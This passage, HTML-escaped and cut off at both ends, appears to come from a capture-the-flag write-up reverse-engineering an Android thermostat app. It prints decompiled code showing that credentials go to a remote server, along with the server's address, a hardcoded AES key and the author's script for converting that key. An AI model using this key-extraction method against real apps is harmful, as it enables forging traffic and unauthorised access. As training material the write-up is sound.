DmPj8jrIy0bzAIMzEhANIb5ri2Nz0%2FfFqmnJ3rjk8e005Fnv5uK088J0m7HFCYIe7hgj40pmM5UNmkGs30hxAnycAlyRaDL94ttdw5SqAS%2FW4MMrRVIliym5o9kruL0SoyWZC0kQciksSypgYXswzm%2BAeZve49Cnzr6ikwTN3S7tncfj0WMJznDG890QvBL3O7QjntIQ6Hf9oANAQjphy38wZSi3%2FB45i5bX5Kr2E9NKFLEy5UWui5G%2BmfVfaVyg%3D%3D\u0026amp;X-Amz-Signature=9b1e5f52dcbef922780298fd782d61a14bbc05631a80c4a404fcca1baec479a9\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eInside the \u003ccode\u003eThermostatActivity\u003c/code\u003e class, I found the \u003ccode\u003esetDefaults\u003c/code\u003e function, which appears to send the username, password and the command \u003ccode\u003egetTemp\u003c/code\u003e\u003cbr\u003e\nto some remote server using the \u003ccode\u003ePayloadRequest\u003c/code\u003e class.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e    \u003cspan class=\"kd\"\u003eprivate\u003c/span\u003e \u003cspan class=\"kt\"\u003evoid\u003c/span\u003e \u003cspan class=\"nf\"\u003esetDefaults\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003efinal\u003c/span\u003e \u003cspan class=\"nc\"\u003eThermostatModel\u003c/span\u003e \u003cspan class=\"n\"\u003ethermostatModel\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"kd\"\u003ethrows\u003c/span\u003e \u003cspan class=\"nc\"\u003eException\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"n\"\u003ethermostatModel\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esetTargetTemperature\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eInteger\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003evalueOf\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e77\u003c/span\u003e\u003cspan class=\"o\"\u003e));\u003c/span\u003e\n        \u003cspan class=\"n\"\u003ethermostatModel\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esetCurrentTemperature\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eInteger\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003evalueOf\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e76\u003c/span\u003e\u003cspan class=\"o\"\u003e));\u003c/span\u003e\n        \u003cspan class=\"nc\"\u003eJSONObject\u003c/span\u003e \u003cspan class=\"n\"\u003ejSONObject\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eJSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e();\u003c/span\u003e\n        \u003cspan class=\"n\"\u003ejSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eput\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;username\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"nc\"\u003eLoginActivity\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eusername\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"n\"\u003ejSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eput\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;password\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"nc\"\u003eLoginActivity\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003epassword\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"n\"\u003ejSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eput\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;cmd\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;getTemp\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"n\"\u003evolleyQueue\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eadd\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ejSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eListener\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nc\"\u003eString\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;()\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"kd\"\u003epublic\u003c/span\u003e \u003cspan class=\"kt\"\u003evoid\u003c/span\u003e \u003cspan class=\"nf\"\u003eonResponse\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n                \u003cspan class=\"n\"\u003ethermostatModel\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esetTargetTemperature\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eInteger\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003evalueOf\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e70\u003c/span\u003e\u003cspan class=\"o\"\u003e));\u003c/span\u003e\n                \u003cspan class=\"n\"\u003ethermostatModel\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esetCurrentTemperature\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eInteger\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003evalueOf\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e73\u003c/span\u003e\u003cspan class=\"o\"\u003e));\u003c/span\u003e\n            \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n        \u003cspan class=\"o\"\u003e}));\u003c/span\u003e\n    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eFrom the \u003ccode\u003ePayloadRequest\u003c/code\u003e class, I found the URL of the remote server it sends the requests to. It also contained the details about the algorithm\u003cbr\u003e\nit uses to encrypt and decrypt communications between the app and the remote server.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e    \u003cspan class=\"kd\"\u003epublic\u003c/span\u003e \u003cspan class=\"nf\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eJSONObject\u003c/span\u003e \u003cspan class=\"n\"\u003ejSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"kd\"\u003efinal\u003c/span\u003e \u003cspan class=\"nc\"\u003eListener\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nc\"\u003eString\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"n\"\u003elistener\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"kd\"\u003ethrows\u003c/span\u003e \u003cspan class=\"nc\"\u003eException\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"kd\"\u003esuper\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;http://35.243.186.41/\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eErrorListener\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"kd\"\u003epublic\u003c/span\u003e \u003cspan class=\"kt\"\u003evoid\u003c/span\u003e \u003cspan class=\"nf\"\u003eonErrorResponse\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eVolleyError\u003c/span\u003e \u003cspan class=\"n\"\u003evolleyError\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n                \u003cspan class=\"n\"\u003elistener\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eonResponse\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Connection failed\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n        \u003cspan class=\"o\"\u003e});\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003emListener\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003elistener\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003emParams\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eput\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;d\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ebuildPayload\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ejSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e));\u003c/span\u003e\n    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\n    \u003cspan class=\"kd\"\u003eprivate\u003c/span\u003e \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"nf\"\u003ebuildPayload\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eJSONObject\u003c/span\u003e \u003cspan class=\"n\"\u003ejSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"kd\"\u003ethrows\u003c/span\u003e \u003cspan class=\"nc\"\u003eException\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nc\"\u003eKey\u003c/span\u003e \u003cspan class=\"n\"\u003esecretKeySpec\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eSecretKeySpec\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[]{(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e56\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e79\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e46\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e106\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e26\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e5\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e27\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e34\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e59\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"nc\"\u003eByte\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eMIN_VALUE\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e23\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e96\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e96\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e90\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e80\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e116\u003c/span\u003e\u003cspan class=\"o\"\u003e},\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;AES\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"nc\"\u003eObject\u003c/span\u003e \u003cspan class=\"n\"\u003eobj\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"o\"\u003e];\u003c/span\u003e\n        \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nf\"\u003eSecureRandom\u003c/span\u003e\u003cspan class=\"o\"\u003e().\u003c/span\u003e\u003cspan class=\"na\"\u003enextBytes\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eobj\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"nc\"\u003eAlgorithmParameterSpec\u003c/span\u003e \u003cspan class=\"n\"\u003eivParameterSpec\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eIvParameterSpec\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eobj\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"nc\"\u003eCipher\u003c/span\u003e \u003cspan class=\"n\"\u003einstance\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nc\"\u003eCipher\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetInstance\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;AES/CBC/PKCS5Padding\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"o\"\u003e...\u003c/span\u003e\n        \u003cspan class=\"o\"\u003e...\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe AES key is a hardcoded 16-byte key, and the algorithm used is AES in CBC mode with PKCS5 Padding and a Random IV. I wrote a simple script in Java to\u003cbr\u003e\nconvert the key to unsigned bytes that can be used easily with a AES library.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003ejava.io.*\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"kd\"\u003eclass\u003c/span\u003e \u003cspan class=\"nc\"\u003eIdeone\u003c/span\u003e\n\u003cspan class=\"o\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"kd\"\u003epublic\u003c/span\u003e \u003cspan class=\"kd\"\u003estatic\u003c/span\u003e \u003cspan class=\"kt\"\u003evoid\u003c/span\u003e \u003cspan class=\"nf\"\u003emain\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eString\u003c/span\u003e\u003cspan class=\"o\"\u003e[]\u003c/span\u003e \u003cspan class=\"n\"\u003eargs\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"kd\"\u003ethrows\u003c/span\u003e \u003cspan class=\"n\"\u003ejava\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003elang\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eException\u003c/span\u003e\n  \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[]\u003c/span\u003e \u003cspan class=\"n\"\u003ekey\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[]{(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e56\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e79\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e46\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e106\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e26\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e5\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e27\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e34\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e59\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"nc\"\u003eByte\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eMIN_VALUE\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e23\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e96\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e96\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e90\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e80\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e116\u003c/span\u003e\u003cspan class=\"o\"\u003e};\u003c/span\u003e\n    \u003cspan class=\"k\"\u003efor\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003eint\u003c/span\u003e \u003cspan class=\"n\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e \u003cspan class=\"n\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e \u003cspan class=\"n\"\u003ei\u003c/span\u003e\u003cspan class=\"o\"\u003e++)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"nc\"\u003eSystem\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eout\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eprint\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ekey\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ei\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e \u003cspan class=\"mh\"\u003e0xff\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n      \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ei\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e15\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"nc\"\u003eSystem\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eout\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eprint\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;, \u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"nc\"\u003eSystem\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eout\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eprintln\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan 